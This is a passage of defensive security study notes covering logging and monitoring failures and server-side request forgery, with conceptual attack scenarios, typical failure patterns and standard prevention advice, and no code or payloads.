        * No integrity controls (hashing, immutability)
        * Local disk-only logging with no remote aggregation
        * Log rotation misconfigured or disabled

3. Application logs **sensitive information** (PII, credentials, tokens)
    * This is a classic case of **exposing confidential data through verbose or careless logging**.
        * Debug logs capture passwords, API keys, session tokens.
        * Error messages log full request bodies, including personal data.
        * Logs become an unencrypted data leak path.
    * **Typical failures shown:**
        * Logging secrets or full authentication headers
        * Logging database dumps or stack traces with sensitive data
        * No data masking or filtering
        * Logs stored without encryption at rest

4. Monitoring systems **do not alert on suspicious behavior**
    * This is a classic case of **poor detection mechanisms allowing attackers to operate freely**.
        * Repeated login attempts never trigger alerts.
        * Large data transfers go unnoticed.
        * Malware persistence, privilege escalation, and lateral movement are undetected.
    * **Typical failures shown:**
        * No [SIEM](Incident%20Response,%20Forensics,%20and%20Disaster%20Recovery.md#SIEM) rules for high-risk events
        * Alert thresholds too high or disabled
        * Critical logs not forwarded to monitoring tools
        * No correlation between different event sources

5. Distributed systems produce **inconsistent or incomplete logs**
    * This is a classic case of **fragmented logging making investigations ineffective**.
        * Microservices omit crucial context like user IDs or request IDs.
        * Logs cannot be correlated across services due to missing timestamps.
        * Event order becomes impossible to reconstruct.
    * **Typical failures shown:**
        * No standardized logging format across components
        * Missing trace IDs or correlation IDs
        * Time drift between servers causing inaccurate timelines
        * Partial logs missing due to service crashes

6. Logging depends on **debug mode** and is disabled in production
    * This is a classic case of **loss of visibility because developers relied on development-only settings**.
        * Attackers exploit vulnerabilities that never appear in logs.
        * Production issues cannot be diagnosed due to lack of traceability.
        * Logging levels are changed manually and forgotten.
    * **Typical failures shown:**
        * Debug logging disabled in production with no alternative auditing
        * Critical errors suppressed by default configs
        * Log verbosity not aligned with operational needs
        * No logging for API failures or malformed requests

7. High-volume attacks **overwhelm logging systems**
    * This is a classic case of **log exhaustion leading to loss of forensic data and monitoring failures**.
        * Attackers flood servers with bogus requests to fill log storage.
        * Log pipelines drop events due to rate limits.
        * Attackers hide malicious activity within the noise.
    * **Typical failures shown:**
        * Log storage fills without alerts or auto-rotation
        * Logging pipeline drops events silently
        * No rate limiting on logging output
        * Critical logs overwritten during flood events

8. Cloud logging configuration is **disabled or misconfigured**
    * This is a classic case of **cloud-native visibility gaps enabling undetected misuse**.
        * S3 access logs, VPC flow logs, and IAM activity logs are turned off.
        * Attackers enumerate resources without detection.
        * Cloud provider events never reach the security team.
    * **Typical failures shown:**
        * Cloud audit trails disabled or never configured
        * Missing logs for object access, API calls, or network flows
        * No export to [SIEM](Incident%20Response,%20Forensics,%20and%20Disaster%20Recovery.md#SIEM) or long-term storage
        * Overly permissive IAM denying access to logs indirectly

9. Logs are **not reviewed or analyzed**
    * This is a classic case of **collected but unused logs providing zero security value**.
        * Known indicators of compromise sit unnoticed for weeks.
        * Abnormal user activity goes uninvestigated.
        * Lack of regular review allows silent persistence.
    * **Typical failures shown:**
        * No operational log review process
        * [SIEM](Incident%20Response,%20Forensics,%20and%20Disaster%20Recovery.md#SIEM) alerts ignored or unassigned
        * Manual log review not part of incident response
        * No SLA for investigating security events

#### How to prevent

- Ensure important failures can be **logged with sufficient user context** to identify suspicious/malicious acts and held for enough time to allow forensic analysis.
- Ensure that logs are generated in a format that log management solutions can easily consume. (**encoded correctly to prevent injections or attacks**)
- Ensure high-value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar.
- **DevSecOps** teams should establish effective monitoring and alerting such that suspicious activities are detected and responded to quickly.
- Establish or adopt an **incident response and recovery plan** (NIST 800-61r2 or later).
- Protect the resources that log data.

### Server-Side Request Forgery (SSRF)

SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL.

#### Cases

- It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).
- As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.

#### Attack scenarios

1. Application fetches a **user-supplied URL** without validation  
    * This is a classic case of **untrusted input controlling server-side network requests**.
        * Attackers supply internal IPs to access sensitive services (e.g., metadata endpoints).
        * The server becomes a proxy for scanning internal networks.
        * Attackers pivot into restricted environments by chaining responses.
    * **Typical failures shown:**
        * Directly using user input in HTTP clients without filtering
        * Allowing requests to internal networks (127.0.0.1, 169.254.169.254, 10.x.x.x)
        * No allowlist or URL normalization
        * Server leaks internal responses back to attackers

2. Server processes **image, PDF, or file URLs** provided by users  
    * This is a classic case of **URL-based file retrieval enabling internal resource exposure**.
        * “Fetch image from URL” endpoints pull internal files via file:// or gopher:// schemes.
        * Attackers bypass host checks through DNS rebinding or redirects.
        * The server unintentionally leaks internal filesystem contents.
    * **Typical failures shown:**
        * Accepting non-HTTP schemes (file://, gopher://, ftp://)
        * Following 302 redirects to internal addresses
        * No scheme or hostname restrictions
        * Returning fetched file contents to the attacker

3. Server-side integrations with **webhooks or callbacks** accept attacker-controlled endpoints  
    * This is a classic case of **server-initiated network interactions triggered by external parties**.
        * Attackers register callback URLs pointing to internal services.
        * Automated systems execute internal API calls on behalf of the attacker.
        * Sensitive metadata APIs or admin interfaces become reachable indirectly.
    * **Typical failures shown:**
        * No validation of callback or webhook target domains
        * Outbound access allowed to internal or private subnets
        * Services triggered automatically without approval
        * Lack of outbound firewall or egress filtering

4. Cloud-hosted application with access to **metadata APIs**  
    * This is a classic case of **cloud credential theft via SSRF**.
        * Attackers force the server to query metadata endpoints providing IAM tokens.
        * Stolen tokens allow privilege escalation or lateral movement.
        * Cloud service misconfigurations amplify the impact globally.
    * **Typical failures shown:**
        * EC2 / GCP / Azure metadata endpoints exposed via SSRF
        * No IMDSv2 or hardened metadata service settings
        * Over-permissive IAM roles attached to the instance
        * Application returns metadata values to attacker-controlled clients

5. Scheduled server tasks **load configs or feeds from remote URLs**  
    * This is a classic case of **remote configuration retrieval with unvalidated endpoints**.
        * Attackers manipulate configuration URLs via parameter injection.
        * Servers retrieve malicious configurations or scripts.
        * Chained SSRF leads to remote code execution in some systems.
    * **Typical failures shown:**
        * Config or feed URLs not locked down
        * Server retrieves arbitrary remote resources
        * No signature verification for downloaded configs
        * Blind SSRF enabling internal port mapping

6. API gateway or reverse proxy exposes **open redirect or rewrite behavior**  
    * This is a classic case of **proxy-based SSRF enabling internal service access**.
        * Attackers exploit URL rewrite rules to hit internal admin services.
        * HTTP smuggling tricks proxies into routing requests incorrectly.
        * SSRF occurs even if the application itself never makes HTTP requests.
    * **Typical failures shown:**
        * Misconfigured reverse proxy rewrite rules
        * Open redirects leading through trusted infrastructure
        * Gateway fails to enforce outbound host restrictions
        * Internal admin panels accessible indirectly through proxy paths

7. Application validates hostnames but **fails to validate resolved IPs**  
    * This is a classic case of **DNS rebinding bypassing naive host-based checks**.
        * Attackers host domains resolving to external IPs initially.
        * DNS TTL expires → rebinding to internal IP (e.g., 127.0.0.1).
        * Validation passes, but request is ultimately sent to internal systems.
    * **Typical failures shown:**
        * Only string-matching hostnames without resolution checks
        * Allowing dynamic DNS without revalidation
        * Trusting domain names controlled by attackers
        * Allowing outbound requests to private ranges via DNS tricks

#### How to prevent

* **Application Layer**

  - Sanitize and validate all client-supplied input data

  - Enforce the URL schema, port, and destination with a positive allow list
    - Do not mitigate SSRF via the use of a deny list or regular expression. Attackers have payload lists, tools, and skills to bypass deny lists.

  - Do not send raw responses to clients

  - Disable HTTP redirections

* **Network Layer**

  - Segment remote resource access functionality in separate networks to reduce the impact of SSRF
  - Enforce “deny by default” firewall policies or network access control rules to block all but essential intranet traffic.
  - Establish an ownership and a lifecycle for firewall rules based on applications.
  - Log all accepted and blocked network flows on firewalls (A09:202).
